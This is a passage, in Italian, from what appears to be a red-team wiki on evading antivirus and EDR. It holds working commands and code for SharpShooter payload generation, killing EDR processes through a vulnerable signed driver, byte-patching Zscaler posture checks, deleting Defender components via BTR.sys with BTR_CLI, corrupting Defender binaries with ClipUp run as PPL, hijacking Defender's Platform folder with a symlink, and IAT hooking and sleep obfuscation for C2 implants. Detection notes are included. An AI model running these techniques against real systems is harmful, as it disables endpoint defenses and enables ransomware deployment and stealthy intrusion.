# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```

### Altro

- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)

## Bring Your Own Vulnerable Driver (BYOVD) – Terminare AV/EDR dal kernel

Storm-2603 ha sfruttato una piccola utility console nota come **Antivirus Terminator** per disabilitare le protezioni degli endpoint prima di distribuire ransomware. Lo strumento porta con sé un **driver vulnerabile ma *firmato*** e ne abusa per eseguire operazioni privilegiate nel kernel che persino i servizi AV Protected-Process-Light (PPL) non possono bloccare.<sup>[[12]](#references)</sup>

Punti chiave
1. **Driver firmato**: il file scritto su disco è `ServiceMouse.sys`, ma il binario è il driver legittimamente firmato `AToolsKrnl64.sys` del “System In-Depth Analysis Toolkit” di Antiy Labs. Poiché il driver ha una firma Microsoft valida, viene caricato anche quando Driver-Signature-Enforcement (DSE) è abilitato.
2. **Installazione del servizio**:
   ```powershell
   sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
   sc start  ServiceMouse
   ```
   La prima riga registra il driver come **servizio del kernel** e la seconda lo avvia, rendendo `\\.\ServiceMouse` accessibile dallo spazio utente.
3. **IOCTL esposti dal driver**
   | Codice IOCTL | Funzionalità                              |
   |-----------:|-----------------------------------------|
   | `0x99000050` | Termina un processo arbitrario tramite PID (usato per terminare i servizi Defender/EDR) |
   | `0x990000D0` | Elimina un file arbitrario dal disco |
   | `0x990001D0` | Scarica il driver e rimuove il servizio |

   Proof-of-concept C minimale:
   ```c
   #include <windows.h>
   
   int main(int argc, char **argv){
       DWORD pid = strtoul(argv[1], NULL, 10);
       HANDLE hDrv = CreateFileA("\\\\.\\ServiceMouse", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
       DeviceIoControl(hDrv, 0x99000050, &pid, sizeof(pid), NULL, 0, NULL, NULL);
       CloseHandle(hDrv);
       return 0;
   }
   ```
4. **Perché funziona**: BYOVD aggira completamente le protezioni in modalità utente; il codice eseguito nel kernel può aprire processi *protetti*, terminarli o manomettere gli oggetti del kernel, indipendentemente da PPL/PP, ELAM o altre funzionalità di hardening.

Rilevamento / Mitigazione
•  Abilita l’elenco di blocco dei driver vulnerabili di Microsoft (`HVCI`, `Smart App Control`) in modo che Windows rifiuti di caricare `AToolsKrnl64.sys`.
•  Monitora la creazione di nuovi servizi *kernel* e genera un avviso quando un driver viene caricato da una directory scrivibile da tutti o non presente nell’elenco degli elementi consentiti.
•  Cerca gli handle in modalità utente verso oggetti dispositivo personalizzati, seguiti da chiamate sospette a `DeviceIoControl`.

### Aggirare i controlli di postura di Zscaler Client Connector modificando i binari su disco

**Client Connector** di Zscaler applica localmente le regole di postura del dispositivo e si affida a Windows RPC per comunicare i risultati agli altri componenti. Due scelte progettuali deboli rendono possibile un aggiramento completo:

1. La valutazione della postura avviene **interamente lato client** (al server viene inviato un valore booleano).
2. Gli endpoint RPC interni verificano soltanto che l’eseguibile che si connette sia **firmato da Zscaler** (tramite `WinVerifyTrust`).<sup>[[11]](#references)</sup>

**Modificando quattro binari firmati su disco**, è possibile neutralizzare entrambi i meccanismi:

| Binario | Logica originale modificata | Risultato |
|--------|------------------------|---------|
| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | Restituisce sempre `1`, quindi tutti i controlli risultano conformi |
| `ZSAService.exe` | Chiamata indiretta a `WinVerifyTrust` | Sostituita con NOP ⇒ qualsiasi processo (anche non firmato) può collegarsi alle pipe RPC |
| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | Sostituita con `mov eax,1 ; ret` |
| `ZSATunnel.exe` | Controlli di integrità del tunnel | Aggirati |

Estratto del patcher minimale:

```python
pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1

with open("ZSATrayManager.exe", "r+b") as f:
    data = f.read()
    off = data.find(pattern)
    if off == -1:
        print("pattern not found")
    else:
        f.seek(off)
        f.write(replacement)
```

Dopo aver sostituito i file originali e riavviato lo stack dei servizi:

* **Tutti** i controlli di postura risultano **verdi/conformi**.
* I binari non firmati o modificati possono aprire gli endpoint RPC delle named pipe (ad es. `\\RPC Control\\ZSATrayManager_talk_to_me`).
* L'host compromesso ottiene accesso senza restrizioni alla rete interna definita dalle policy Zscaler.

Questo caso di studio dimostra come decisioni di fiducia prese esclusivamente lato client e semplici controlli delle firme possano essere aggirati con poche patch di byte.

## Abuso delle funzionalità attendibili di Microsoft Defender `BTR.sys`

Il driver **Boot-Time Removal** di Defender è un utile termine di paragone rispetto al BYOVD classico. `BTR.sys` è un componente di remediation legittimo e firmato da Microsoft, senza bug di corruzione della memoria né interfaccia IOCTL; dopo aver ottenuto l'accesso amministrativo e `SeLoadDriverPrivilege`, un operatore può invece contraffare la transazione privata di remediation e ottenere le operazioni previste su file e registro a Ring-0. Si tratta di una **primitiva di neutralizzazione di AV/EDR post-compromissione, non di accesso iniziale o escalation dei privilegi**; inoltre, il driver può essere estratto dalla risorsa `BOOTTIMETOOL` di `MpEngine.dll` presente sul sistema bersaglio, anziché importare un vistoso driver di terze parti.<sup>[[36]](#references)</sup>

### Preparazione del driver monouso

Normalmente Defender salva la risorsa in un file `[a-z]{8}.sys` con nome casuale e registra un servizio kernel con un nome simile. `DriverEntry` legge il valore `Args` del servizio, apre l'ADS NTFS indicato, decifra e convalida l'elenco delle azioni, scrive i feedback e, dopo l'esecuzione corretta, restituisce `0xC0000056` (`STATUS_DELETE_PENDING`), così il driver viene scaricato invece di rimanere residente. Un servizio contraffatto presenta i seguenti valori caratteristici.<sup>[[36]](#references)[[37]](#references)</sup>

```text
Type         = 1
Start        = 1
ErrorControl = 0
ImagePath    = \??\C:\Windows\System32\drivers\<random>.sys
Group        = Boot Bus Extender
Args         = C:\Windows\System32\drivers\<random>.sys:changelist
```

Lo stream `:changelist` contiene un blob cifrato con RC4. Nelle build analizzate viene riutilizzata una chiave fissa di 256 byte, quindi la cifratura non costituisce un confine di autorizzazione. Un plaintext valido ha un’intestazione globale di 24 byte (`Magic=0xFEE1DEAD`, `Version=2`, `PayloadOffset=0x10`, CRC dell’intestazione e un ID di transazione derivato dal payload), seguita da un percorso di feedback UTF-16 con terminazione null e da un numero qualsiasi di elementi. Ogni elemento ha un’intestazione di 16 byte (`DataSize`, `Action`, `HeaderCRC`, `DataCRC`) più dati specifici dell’azione, che terminano con **esattamente quattro byte NUL**. Ogni regione di intestazione/dati viene verificata indipendentemente con CRC-32, polinomio `0xEDB88320`, stato iniziale `0xFFFFFFFF` e **senza XOR finale** (`~CRC32`); lo stato CRC viene azzerato per ogni regione.<sup>[[36]](#references)[[37]](#references)</sup>

Gli ID delle azioni accettate espongono queste primitive del kernel.<sup>[[36]](#references)[[37]](#references)</sup>

| ID | Dati dell’elemento | Risultato |
| --- | --- | --- |
| 1 | `[percorso UTF-16]` | Elimina un file, anche se bloccato |
| 2 | `[percorso UTF-16]` | Rimuove una directory vuota |
| 3 | `[Flag][origine][destinazione]` | Sposta un file in un percorso protetto scelto dall’attaccante; una destinazione vuota comporta l’eliminazione |
| 4 | `[Flag][percorso della chiave]` | Elimina ricorsivamente una chiave del registro |
| 5 | `[Flag][percorso della chiave + "\\" + valore]` | Elimina un valore del registro |
| 6 | `[Flag][tipo][dimensione][percorso della chiave + "\\" + valore][dati]` | Crea/aggiorna un valore del registro e crea i percorsi delle chiavi mancanti |

Per le azioni 5 e 6, il separatore chiave/valore sul wire è formato da **due backslash consecutivi**; un percorso formattato secondo le convenzioni non verrà suddiviso correttamente. Il file di feedback rispecchia in gran parte la richiesta, ma i primi quattro byte di dati di ogni elemento diventano il relativo `NTSTATUS`. Per le azioni 1 e 2, che non hanno un campo iniziale per i flag, BTR sposta il percorso nei quattro byte finali riservati per fare spazio a questo stato.<sup>[[36]](#references)</sup>

### Flusso di lavoro di `BTR_CLI` e finestra di avvio precoce

[`BTR_CLI`](https://github.com/Dump-GUY/BTR_CLI) implementa l’intera catena: estrae `BTR.sys` da Defender locale, crea `<random>.sys:changelist` e uno stream di feedback, serializza, calcola i checksum e cifra azioni concatenate, crea direttamente la chiave del servizio nel registro, quindi chiama `NtLoadDriver` per `-trigger now` oppure lascia il driver come driver di avvio del sistema con `-trigger boot`. La preparazione diretta nel registro evita il normale percorso SCM `CreateServiceW` e quindi **non** genera l’evento di installazione del servizio con ID 7045. Gli artefatti attivati all’avvio possono essere rimossi in seguito con `BTR_CLI.exe -cleanup <service_name>`.<sup>[[36]](#references)[[37]](#references)</sup>

```powershell
# Runtime: remove protected security-service registrations from Ring 0
BTR_CLI.exe -chain -item "4|HKLM\SYSTEM\CurrentControlSet\Services\WdFilter" -item "4|HKLM\SYSTEM\CurrentControlSet\Services\WinDefend" -trigger now

# Boot: delete a security driver before its user-mode protection stack starts
BTR_CLI.exe -a 1 -s "C:\Windows\System32\drivers\wd\WdFilter.sys" -trigger boot
```

`Start=0` non è utilizzabile perché BTR esegue operazioni di I/O sui file da `DriverEntry` prima che lo stack di archiviazione e il collegamento `SystemRoot` siano pronti. `Start=1` insieme al gruppo ad alta priorità `Boot Bus Extender` viene invece eseguito nella Fase 1: NTFS è utilizzabile, ma molti driver di sicurezza con avvio di sistema e servizi EDR in modalità utente non sono ancora stati inizializzati. I filtri con avvio automatico, come `WdFilter`, potrebbero essere già caricati, ma BTR può rimuoverne i binari o la configurazione del servizio prima dell'avvio successivo e può eliminare gli eseguibili dei servizi prima che SCM li avvii. ELAM non colma questa lacuna perché BTR viene eseguito dopo la valutazione dei driver di avvio e dispone di una firma Microsoft valida.<sup>[[36]](#references)</sup>

Più azioni vengono eseguite in un'unica transazione. La PoC antepone l'Azione 1 per il percorso hardcoded `\SystemRoot\Temp\BootClean.log`: BTR crea questo log, quindi esegue la propria richiesta di eliminazione e lo rimuove prima di scaricarsi. Questo riduce le prove, mentre inserire il feedback in `<random>.sys:<random>.dat` consente di rimuovere insieme il driver e i due flussi.<sup>[[36]](#references)[[37]](#references)</sup>

### Correlazioni di rilevamento ad alto segnale

Le regole basate solo sulle firme e la blocklist Microsoft dei driver vulnerabili non contrastano l'abuso delle funzionalità previste di BTR. È preferibile usare queste correlazioni comportamentali, distinguendo al contempo la legittima discendenza di Defender da un launcher arbitrario.<sup>[[36]](#references)</sup>

- **Sysmon 15:** la creazione di `.sys:changelist` è universale durante lo staging di BTR. Un ADS `.dat` collegato allo stesso `.sys` è particolarmente sospetto, perché Defender di norma colloca il feedback in `C:\ProgramData\Microsoft\Windows Defender\Scans\RebootActions\`.
- **Sysmon 12/13 senza System 7045:** correlare la creazione diretta di `HKLM\SYSTEM\CurrentControlSet\Services\<random>` contenente `Args=...:changelist` e `Group=Boot Bus Extender` con l'assenza del corrispondente evento di installazione SCM.
- **Sysmon 6 -> 23:** correlare il caricamento di un driver BTR noto, proveniente da una discendenza non-Defender, con la successiva eliminazione di file attribuita a `System`/PID 4, in particolare per i binari di sicurezza.
- **Sysmon 11 -> 23:** generare un avviso per la rapida creazione ed eliminazione di `\SystemRoot\Temp\BootClean.log` da parte di `System`/PID 4.
- Limitare e monitorare l'assegnazione e l'abilitazione di `SeLoadDriverPrivilege`; una firma Microsoft da sola non basta a garantire l'affidabilità quando un driver di uno strumento di sicurezza viene predisposto da `cmd.exe`, PowerShell o un processo sconosciuto.

## Abusare di Protected Process Light (PPL) per manomettere AV/EDR con LOLBINs

Protected Process Light (PPL) applica una gerarchia di firmatari/livelli, in modo che solo i processi protetti con livello pari o superiore possano manomettersi a vicenda. Dal punto di vista offensivo, se puoi avviare legittimamente un binario abilitato per PPL e controllarne gli argomenti, puoi trasformare una funzionalità innocua (ad es. la registrazione) in una primitiva di scrittura vincolata, basata su PPL, contro le directory protette usate da AV/EDR.<sup>[[16]](#references)[[17]](#references)[[18]](#references)[[19]](#references)[[20]](#references)</sup>

Cosa serve perché un processo venga eseguito come PPL
- L'EXE di destinazione (e tutte le DLL caricate) deve essere firmato con un EKU compatibile con PPL.
- Il processo deve essere creato con CreateProcess usando i flag: `EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS`.
- È necessario richiedere un livello di protezione compatibile con il firmatario del binario (ad es. `PROTECTION_LEVEL_ANTIMALWARE_LIGHT` per i firmatari anti-malware, `PROTECTION_LEVEL_WINDOWS` per i firmatari Windows). Livelli errati impediranno la creazione.

Vedi anche una panoramica più ampia di PP/PPL e della protezione di LSASS qui:

{{#ref}}
stealing-credentials/credentials-protections.md
{{#endref}}

Strumenti per il launcher
- Helper open source: CreateProcessAsPPL (seleziona il livello di protezione e inoltra gli argomenti all'EXE di destinazione):
  - [https://github.com/2x7EQ13/CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)<sup>[[19]](#references)</sup>
- Schema di utilizzo:

```text
CreateProcessAsPPL.exe <level 0..4> <path-to-ppl-capable-exe> [args...]
# example: spawn a Windows-signed component at PPL level 1 (Windows)
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe <args>
# example: spawn an anti-malware signed component at level 3
CreateProcessAsPPL.exe 3 <anti-malware-signed-exe> <args>
```

LOLBIN primitive: ClipUp.exe
- Il binario di sistema firmato `C:\Windows\System32\ClipUp.exe` si avvia autonomamente e accetta un parametro per scrivere un file di log in un percorso specificato dal chiamante.
- Se avviato come processo PPL, la scrittura del file avviene con protezione PPL.
- ClipUp non è in grado di analizzare percorsi contenenti spazi; usa i percorsi brevi 8.3 per indicare posizioni normalmente protette.

Helper per i percorsi brevi 8.3
- Elenca i nomi brevi: `dir /x` in ogni directory principale.
- Ricava il percorso breve in cmd: `for %A in ("C:\ProgramData\Microsoft\Windows Defender\Platform") do @echo %~sA`

Catena di abuso (astratta)
1) Avvia il LOLBIN con capacità PPL (ClipUp) usando `CREATE_PROTECTED_PROCESS` tramite un launcher (ad es. CreateProcessAsPPL).
2) Passa l'argomento del percorso del log di ClipUp per forzare la creazione di un file in una directory AV protetta (ad es. Defender Platform). Se necessario, usa i nomi brevi 8.3.
3) Se il binario di destinazione è normalmente aperto/bloccato dall'AV mentre è in esecuzione (ad es. MsMpEng.exe), pianifica la scrittura all'avvio, prima che si avvii l'AV, installando un servizio ad avvio automatico che venga eseguito in modo affidabile in anticipo. Verifica l'ordine di avvio con Process Monitor (registrazione all'avvio).
4) Al riavvio, la scrittura con protezione PPL avviene prima che l'AV blocchi i suoi binari, corrompendo il file di destinazione e impedendone l'avvio.

Esempio di invocazione (percorsi oscurati/abbreviati per sicurezza):

```text
# Run ClipUp as PPL at Windows signer level (1) and point its log to a protected folder using 8.3 names
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe -ppl C:\PROGRA~3\MICROS~1\WINDOW~1\Platform\<ver>\samplew.dll
```

Note e vincoli
- Non puoi controllare il contenuto scritto da ClipUp, ma solo la posizione; questa primitiva è adatta alla corruzione, non all’iniezione precisa di contenuti.
- Sono necessari privilegi di amministratore locale/SYSTEM per installare/avviare un servizio e una finestra di riavvio.
- La tempistica è fondamentale: il file di destinazione non deve essere aperto; l’esecuzione all’avvio evita i blocchi dei file.

Rilevamenti
- Creazione del processo `ClipUp.exe` con argomenti insoliti, specialmente se avviato da processi padre non standard, durante o in prossimità dell’avvio.
- Nuovi servizi configurati per l’avvio automatico di binari sospetti e che si avviano sistematicamente prima di Defender/AV. Indagare sulla creazione/modifica dei servizi antecedente agli errori di avvio di Defender.
- Monitoraggio dell’integrità dei file dei binari e delle directory Platform di Defender; creazioni/modifiche impreviste di file da parte di processi con flag di processo protetto.
- Telemetria ETW/EDR: cercare processi creati con `CREATE_PROTECTED_PROCESS` e l’uso anomalo del livello PPL da parte di binari non AV.

Mitigazioni
- WDAC/Code Integrity: limitare quali binari firmati possono essere eseguiti come PPL e con quali processi padre; bloccare l’invocazione di ClipUp al di fuori dei contesti legittimi.
- Gestione dei servizi: limitare la creazione/modifica dei servizi ad avvio automatico e monitorare la manipolazione dell’ordine di avvio.
- Assicurarsi che la protezione antimanomissione di Defender e le protezioni di avvio anticipato siano abilitate; indagare sugli errori di avvio che indicano la corruzione dei binari.
- Valutare la disabilitazione della generazione dei nomi brevi 8.3 nei volumi che ospitano strumenti di sicurezza, se compatibile con il proprio ambiente (testare accuratamente).

## Manomissione di Microsoft Defender tramite hijack di symlink della cartella Platform

Windows Defender sceglie la piattaforma da cui viene eseguito enumerando le sottocartelle in:
- `C:\ProgramData\Microsoft\Windows Defender\Platform\`

Seleziona la sottocartella con la stringa di versione lessicograficamente più alta (ad es. `4.18.25070.5-0`), quindi avvia da lì i processi del servizio Defender (aggiornando di conseguenza i percorsi del servizio/registro). Questa selezione considera attendibili le voci delle directory, inclusi i reparse point delle directory (symlink). Un amministratore può sfruttare questo comportamento per reindirizzare Defender a un percorso scrivibile da un utente malintenzionato e ottenere DLL sideloading o interrompere il servizio.<sup>[[21]](#references)[[22]](#references)</sup>

Prerequisiti
- Amministratore locale (necessario per creare directory/symlink nella cartella Platform)
- Possibilità di riavviare o attivare una nuova selezione della piattaforma Defender (riavvio del servizio all’avvio)
- Sono sufficienti gli strumenti integrati (mklink)

Perché funziona
- Defender impedisce le scritture nelle proprie cartelle, ma la selezione della piattaforma considera attendibili le voci delle directory e sceglie la versione lessicograficamente più alta senza verificare che la destinazione corrisponda a un percorso protetto/attendibile.

Procedura dettagliata (esempio)
1) Prepara una copia scrivibile della cartella della piattaforma corrente, ad es. `C:\TMP\AV`:
```cmd
set SRC="C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25070.5-0"
set DST="C:\TMP\AV"
robocopy %SRC% %DST% /MIR
```
2) Crea all'interno di Platform un symlink di directory con una versione superiore che punti alla tua cartella:
```cmd
mklink /D "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0" "C:\TMP\AV"
```
3) Selezione del trigger (riavvio consigliato):
```cmd
shutdown /r /t 0
```
4) Verifica che MsMpEng.exe (WinDefend) venga eseguito dal percorso reindirizzato:
```powershell
Get-Process MsMpEng | Select-Object Id,Path
# or
wmic process where name='MsMpEng.exe' get ProcessId,ExecutablePath
```
Dovresti osservare il nuovo percorso del processo sotto `C:\TMP\AV\` e la configurazione del servizio/registro che riflette tale percorso.

Opzioni di post-exploitation
- DLL sideloading/code execution: rilasciare/sostituire DLL che Defender carica dalla propria directory applicativa per eseguire codice nei processi di Defender. Vedi la sezione sopra: [DLL Sideloading & Proxying](#dll-sideloading--proxying).
- Service kill/denial: rimuovere il symlink della versione, in modo che al successivo avvio il percorso configurato non venga risolto e Defender non riesca ad avviarsi:
```cmd
rmdir "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0"
```

> [!TIP]
> Nota: questa tecnica non consente di per sé l'escalation dei privilegi; richiede diritti di amministratore.

## API/IAT Hooking + Call-Stack Spoofing con PIC (stile Crystal Kit)

I Red team possono spostare l'evasione in fase di runtime dall'impianto C2 al modulo target, eseguendo l'hooking della sua Import Address Table (IAT) e instradando API selezionate attraverso codice position-independent (PIC) controllato dall'attaccante. Questo generalizza l'evasione oltre la limitata superficie API esposta da molti kit (ad es., CreateProcessA) ed estende le stesse protezioni ai BOF e alle DLL di post-exploitation.<sup>[[3]](#references)[[4]](#references)[[5]](#references)</sup>

Approccio generale
- Carica uno Stage PIC insieme al modulo target usando un reflective loader (anteposto o come componente aggiuntivo). Il PIC deve essere autonomo e position-independent.
- Durante il caricamento della DLL host, esamina il suo IMAGE_IMPORT_DESCRIPTOR e applica patch alle voci IAT degli import target (ad es., CreateProcessA/W, CreateThread, LoadLibraryA/W, VirtualAlloc) in modo che puntino a wrapper PIC essenziali.
- Ogni wrapper PIC esegue le tecniche di evasione prima di effettuare una chiamata tail-call all'indirizzo della vera API. Le tecniche di evasione tipiche includono:
  - Mascheramento e ripristino della memoria attorno alla chiamata (ad es., cifrare le regioni del beacon, passare da RWX a RX, modificare i nomi o le autorizzazioni delle pagine), quindi ripristinarla dopo la chiamata.
  - Call-stack spoofing: costruire uno stack legittimo e passare all'API target in modo che l'analisi del call stack risolva i frame attesi.<sup>[[9]](#references)</sup>
- Per garantire la compatibilità, esporta un'interfaccia che consenta a uno script Aggressor (o equivalente) di registrare le API da sottoporre a hooking per Beacon, BOF e DLL di post-exploitation.

Perché usare l'IAT hooking in questo caso
- Funziona con qualsiasi codice che usa l'import sottoposto a hooking, senza modificare il codice dello strumento né fare affidamento su Beacon per fare da proxy per API specifiche.
- Copre le DLL di post-exploitation: eseguire l'hooking di LoadLibrary* consente di intercettare il caricamento dei moduli (ad es., System.Management.Automation.dll, clr.dll) e applicare le stesse tecniche di mascheramento ed evasione dello stack alle loro chiamate API.
- Ripristina un uso affidabile dei comandi di post-exploitation che avviano processi contro i sistemi di rilevamento basati sul call stack, mediante il wrapping di CreateProcessA/W.

Schema minimale di IAT hooking (pseudocodice C/C++ x64)
```c
// For each IMAGE_IMPORT_DESCRIPTOR
//  For each thunk in the IAT
//    if imported function == "CreateProcessA"
//       WriteProcessMemory(local): IAT[idx] = (ULONG_PTR)Pic_CreateProcessA_Wrapper;
// Wrapper performs: mask(); stack_spoof_call(real_CreateProcessA, args...); unmask();
```
Note
- Applica la patch dopo le rilocazioni/ASLR e prima del primo utilizzo dell’import. I loader riflessivi come TitanLdr/AceLdr dimostrano l’hooking durante il DllMain del modulo caricato.
- Mantieni i wrapper piccoli e sicuri per PIC; risolvi la vera API tramite il valore IAT originale acquisito prima della patch oppure tramite LdrGetProcedureAddress.
- Per PIC, usa transizioni da RW a RX ed evita di lasciare pagine scrivibili ed eseguibili.

Stub di spoofing della call stack
- Gli stub PIC in stile Draugr costruiscono una catena di chiamate falsa (con indirizzi di ritorno in moduli benigni) e poi effettuano il pivot verso la vera API.
- Questo elude i rilevamenti che si aspettano stack canonici da Beacon/BOF per le API sensibili.
- Combinali con tecniche di stack cutting/stack stitching per arrivare nei frame previsti prima del prologo dell’API.

Integrazione operativa
- Anteponi il loader riflessivo alle DLL post-ex, così che PIC e hook si inizializzino automaticamente al caricamento della DLL.
- Usa uno script Aggressor per registrare le API target, in modo che Beacon e BOF usufruiscano in modo trasparente dello stesso percorso di evasione senza modifiche al codice.

Considerazioni su rilevamento/DFIR
- Integrità IAT: voci che puntano a indirizzi non appartenenti a un’immagine (heap/anonimi); verifica periodicamente i puntatori agli import.
- Anomalie dello stack: indirizzi di ritorno che non appartengono a immagini caricate; transizioni improvvise a PIC non appartenente a un’immagine; discendenza RtlUserThreadStart incoerente.
- Telemetria del loader: scritture in-process nell’IAT, attività anticipata di DllMain che modifica gli import thunk, regioni RX inattese create al caricamento.
- Elusione del caricamento delle immagini: se esegui l’hooking di LoadLibrary*, monitora i caricamenti sospetti di assembly automation/clr correlati a eventi di mascheramento della memoria.

Componenti ed esempi correlati
- Loader riflessivi che applicano patch all’IAT durante il caricamento (ad es., TitanLdr, AceLdr)
- Hook di mascheramento della memoria (ad es., simplehook) e PIC per lo stack cutting (stackcutting)
- Stub PIC per lo spoofing della call stack (ad es., Draugr)


## Hooking IAT in fase di importazione + offuscamento durante lo sleep (Crystal Palace/PICO)

### Hook IAT in fase di importazione tramite un PICO residente

Se controlli un loader riflessivo, puoi eseguire l’hooking degli import **durante** `ProcessImports()` sostituendo il puntatore `GetProcAddress` del loader con un resolver personalizzato che controlla prima gli hook:<sup>[[6]](#references)[[7]](#references)[[8]](#references)</sup>

- Crea un **PICO residente** (oggetto PIC persistente) che sopravviva alla liberazione del PIC transitorio del loader.
- Esporta una funzione `setup_hooks()` che sovrascriva il resolver degli import del loader (ad es., `funcs.GetProcAddress = _GetProcAddress`).
- In `_GetProcAddress`, ignora gli import ordinali e usa una ricerca degli hook basata su hash, come `__resolve_hook(ror13hash(name))`. Se esiste un hook, restituiscilo; altrimenti delega la risoluzione al vero `GetProcAddress`.
- Registra i target degli hook al link time con voci Crystal Palace `addhook "MODULE$Func" "hook"`. L’hook rimane valido perché risiede nel PICO residente.

In questo modo si ottiene **il reindirizzamento IAT in fase di importazione** senza applicare patch alla sezione di codice della DLL caricata dopo il caricamento.

### Forzare import agganciabili quando il target usa il PEB-walking

Gli hook in fase di importazione si attivano solo se la funzione è effettivamente presente nell’IAT del target. Se un modulo risolve le API tramite PEB-walk + hash (senza una voce di import), forza un import effettivo affinché il percorso `ProcessImports()` del loader lo intercetti:

- Sostituisci la risoluzione degli export tramite hash (ad es., `GetSymbolAddress(..., HASH_FUNC_WAIT_FOR_SINGLE_OBJECT)`) con un riferimento diretto come `&WaitForSingleObject`.
- Il compilatore genera una voce IAT, consentendo l’intercettazione quando il loader riflessivo risolve gli import.

### Offuscamento dello sleep/idle in stile Ekko senza applicare patch a `Sleep()`

Invece di applicare patch a `Sleep`, esegui l’hooking delle **primitive effettive di attesa/IPC** usate dall’impianto (`WaitForSingleObject(Ex)`, `WaitForMultipleObjects`, `ConnectNamedPipe`). Per le attese prolungate, avvolgi la chiamata in una catena di offuscamento in stile Ekko che crittografa l’immagine in memoria durante i periodi di inattività:<sup>[[31]](#references)[[27]](#references)</sup>

- Usa `CreateTimerQueueTimer` per pianificare una sequenza di callback che chiamano `NtContinue` con frame `CONTEXT` preparati ad hoc.
- Catena tipica (x64): imposta l’immagine su `PAGE_READWRITE` → cifrala con RC4 tramite `advapi32!SystemFunction032` sull’intera immagine mappata → esegui l’attesa bloccante → decifrala con RC4 → **ripristina le autorizzazioni di ciascuna sezione** iterando sulle sezioni PE → segnala il completamento.
- `RtlCaptureContext` fornisce un modello `CONTEXT`; clonalo in più frame e imposta i registri (`Rip/Rcx/Rdx/R8/R9`) per invocare ogni passaggio.

Dettaglio operativo: restituisci “success” per le attese prolungate (ad es., `WAIT_OBJECT_0`), così il chiamante prosegue mentre l’immagine è mascherata. Questo schema nasconde il modulo agli scanner durante i periodi di inattività ed evita la classica firma di `Sleep()` con patch.

Idee per il rilevamento (basate sulla telemetria)
- Raffiche di callback `CreateTimerQueueTimer` che puntano a `NtContinue`.
- Uso di `advapi32!SystemFunction032` su buffer contigui di grandi dimensioni, pari a un’immagine.
- `VirtualProtect` applicato a un intervallo ampio, seguito dal ripristino personalizzato delle autorizzazioni di ciascuna sezione.

### Registrazione CFG a runtime per i gadget di offuscamento dello sleep

Nei target con CFG abilitato, il primo salto indiretto verso un gadget a metà funzione, come `jmp [rbx]` o `jmp rdi`, causa di solito l’arresto anomalo del processo con `STATUS_STACK_BUFFER_OVERRUN`, perché il gadget non è presente nei metadati CFG del modulo. Per mantenere attive le catene in stile Ekko/Kraken nei processi protetti:<sup>[[30]](#references)</sup>

- Registra ogni destinazione indiretta usata dalla catena tramite `NtSetInformationVirtualMemory(..., VmCfgCallTargetInformation, ...)` e voci `CFG_CALL_TARGET_VALID`.
- Per gli indirizzi all’interno di immagini caricate (`ntdll`, `kernel32`, `advapi32`), `MEMORY_RANGE_ENTRY` deve iniziare alla **base dell’immagine** e coprirne **l’intera dimensione**.
- Per le regioni mappate manualmente/PIC/sottoposte a stomping, usa invece la **base dell’allocazione** e la relativa dimensione.
- Contrassegna non solo il gadget di dispatch, ma anche gli export raggiunti indirettamente (`NtContinue`, `SystemFunction032`, `VirtualProtect`, `GetThreadContext`, `SetThreadContext`, le system call di attesa/evento) e qualsiasi sezione eseguibile controllata dall’attaccante che diventerà una destinazione indiretta.

In questo modo le catene di sleep in stile ROP/JOP passano da «funziona solo nei processi senza CFG» a una primitiva riutilizzabile per `explorer.exe`, browser, `svchost.exe` e altri endpoint compilati con `/guard:cf`.

### Spoofing dello stack sicuro per CET nei thread in sleep

La sostituzione completa di `CONTEXT` è rumorosa e può causare problemi nei sistemi CET Shadow Stack, perché un `Rip` contraffatto deve comunque corrispondere allo shadow stack hardware. Uno schema di mascheramento dello sleep più sicuro è il seguente:<sup>[[30]](#references)</sup>

- Scegli un altro thread dello stesso processo e leggi i limiti dello stack `NT_TIB` / TEB (`StackBase`, `StackLimit`) tramite `NtQueryInformationThread`.
- Esegui il backup del TEB/TIB effettivo del thread corrente.
- Acquisisci il contesto effettivo del thread in sleep con `GetThreadContext`.
- Copia **solo** il `Rip` effettivo nel contesto contraffatto, lasciando invariato lo stato contraffatto di `Rsp`/stack.
- Durante lo sleep, copia l’`NT_TIB` del thread contraffatto nel TEB corrente, così che gli stack walker eseguano l’unwinding all’interno di un intervallo di stack legittimo.
- Al termine dell’attesa, ripristina il TIB originale e il contesto del thread.

Questo mantiene un instruction pointer coerente con CET e al contempo inganna gli stack walker EDR che si fidano dei metadati dello stack nel TEB per convalidare l’unwinding.

### Alternativa basata su APC: Kraken Mask

Se il dispatch tramite timer queue è troppo riconoscibile, la stessa sequenza di sleep-crittografia-spoofing-ripristino può essere eseguita da un thread helper sospeso usando APC accodate:<sup>[[27]](#references)</sup>

- Crea un thread helper con `NtTestAlert` come entrypoint.
- Accoda frame `CONTEXT`/APC preparati con `NtQueueApcThread` e avviali con `NtAlertResumeThread`.
- Memorizza lo stato della catena nell’heap anziché nello stack dell’helper, per evitare di esaurire lo stack predefinito da 64 KB del thread.
- Usa `NtSignalAndWaitForSingleObject` per segnalare atomicamente l’evento di avvio e bloccare l’esecuzione.
